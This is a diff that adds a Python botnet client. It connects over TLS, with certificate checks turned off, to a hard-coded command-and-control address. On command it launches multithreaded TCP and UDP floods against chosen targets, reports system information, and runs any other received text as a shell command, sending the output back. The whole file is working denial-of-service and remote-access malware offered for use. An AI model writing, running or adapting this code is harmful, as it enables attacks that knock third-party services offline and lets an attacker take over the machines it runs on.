@@ -1,0 +1,175 @@
+import socket
+import ssl
+import threading
+import time
+import os
+import random
+import subprocess
+import platform
+#import psutil  # you may need to install psutil on the bot environment
+
+def get_system_info():
+    info = []
+    info.append(f"OS: {platform.system()} {platform.release()}")
+    info.append(f"OS Version: {platform.version()}")
+    info.append(f"Architecture: {platform.machine()}")
+    info.append(f"Processor: {platform.processor()}")
+#    info.append(f"CPU Cores: {psutil.cpu_count(logical=False)} physical, {psutil.cpu_count()} logical")
+ #   info.append(f"Total RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB")
+#    info.append(f"Available RAM: {round(psutil.virtual_memory().available / (1024**3), 2)} GB")
+  #  info.append(f"Disk Usage: {psutil.disk_usage('/').percent}% used")
+    return "\n".join(info)
+
+
+
+
+
+def tcp_flood(target_ip, target_port, duration, thread_count=200):
+    print(f"[+] Starting powerful TCP flood on {target_ip}:{target_port} for {duration}s with {thread_count} threads")
+    timeout = time.time() + duration
+
+    def attack():
+        while time.time() < timeout:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(1)
+                s.connect((target_ip, target_port))
+                # Send multiple packets per connection to increase impact
+                for _ in range(10):
+                    if time.time() >= timeout:
+                        break
+                    payload_size = random.randint(1024, 4096)  # 1KB to 4KB random size
+                    s.send(os.urandom(payload_size))
+                s.close()
+            except:
+                pass
+
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        remaining = timeout - time.time()
+        if remaining > 0:
+            t.join(remaining)
+        else:
+            break
+
+    print("[+] TCP flood completed")
+
+def udp_flood(target_ip, target_port, duration, thread_count=200):
+    print(f"[+] Starting powerful UDP flood on {target_ip}:{target_port} for {duration}s with {thread_count} threads")
+    timeout = time.time() + duration
+
+    def attack():
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        while time.time() < timeout:
+            try:
+                # Randomize payload size up to max UDP safe size
+                payload_size = random.randint(1024, 65000)
+                packet = os.urandom(payload_size)
+                sock.sendto(packet, (target_ip, target_port))
+            except:
+                pass
+        sock.close()
+
+    threads = []
+    for _ in range(thread_count):
+        t = threading.Thread(target=attack)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+
+    for t in threads:
+        remaining = timeout - time.time()
+        if remaining > 0:
+            t.join(remaining)
+        else:
+            break
+
+    print("[+] UDP flood completed")
+
+def handle_commands(cnc_ip, cnc_port, certfile=None):
+    context = ssl.create_default_context()
+    if certfile:
+        context.load_verify_locations(certfile)
+    else:
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE  # disable cert verification for testing
+
+    while True:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ssl_sock = context.wrap_socket(sock, server_hostname=cnc_ip)
+            ssl_sock.connect((cnc_ip, cnc_port))
+            print("[+] Connected to CNC server")
+
+            while True:
+                data = ssl_sock.recv(4096)
+                if not data:
+                    print("[-] Disconnected from CNC server")
+                    break
+                command = data.decode(errors='ignore').strip()
+                if not command:
+                    continue
+
+                # Process commands
+                if command.startswith("flood tcp"):
+                    try:
+                        parts = command.split()
+                        # Allow optional thread_count argument
+                        if len(parts) == 5:
+                            _, _, ip, port, duration = parts
+                            threads = 200  # default
+                        elif len(parts) == 6:
+                            _, _, ip, port, duration, threads = parts
+                            threads = int(threads)
+                        else:
+                            ssl_sock.send(b"[-] Invalid TCP flood command format\n")
+                            continue
+                        tcp_flood(ip, int(port), int(duration), thread_count=threads)
+                        ssl_sock.send(b"[+] TCP flood completed\n")
+                    except Exception as e:
+                        ssl_sock.send(f"[-] TCP flood error: {e}\n".encode())
+                elif command == "sysinfo":
+                    sysinfo = get_system_info()
+                    ssl_sock.send(sysinfo.encode())
+
+                elif command.startswith("flood udp"):
+                    try:
+                        parts = command.split()
+                        # Allow optional thread_count argument
+                        if len(parts) == 5:
+                            _, _, ip, port, duration = parts
+                            threads = 200  # default
+                        elif len(parts) == 6:
+                            _, _, ip, port, duration, threads = parts
+                            threads = int(threads)
+                        else:
+                            ssl_sock.send(b"[-] Invalid UDP flood command format\n")
+                            continue
+                        udp_flood(ip, int(port), int(duration), thread_count=threads)
+                        ssl_sock.send(b"[+] UDP flood completed\n")
+                    except Exception as e:
+                        ssl_sock.send(f"[-] UDP flood error: {e}\n".encode())
+
+                else:
+                    # Run shell command
+                    try:
+                        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=15)
+                        ssl_sock.send(output + b"\n")
+                    except subprocess.CalledProcessError as e:
+                        ssl_sock.send(e.output + b"\n")
+                    except Exception as e:
+                        ssl_sock.send(f"[-] Command error: {e}\n".encode())
+        except Exception as e:
+            print(f"[-] Connection error: {e}. Retrying in 5 seconds...")
+            time.sleep(5)
+
+if __name__ == "__main__":
+    # Replace 'server.crt' with your CNC server certificate path if needed
+#    handle_commands("0.tcp.ap.ngrok.io", 16549, certfile=None)
+    handle_commands("103.66.142.220", 1337, certfile=None)
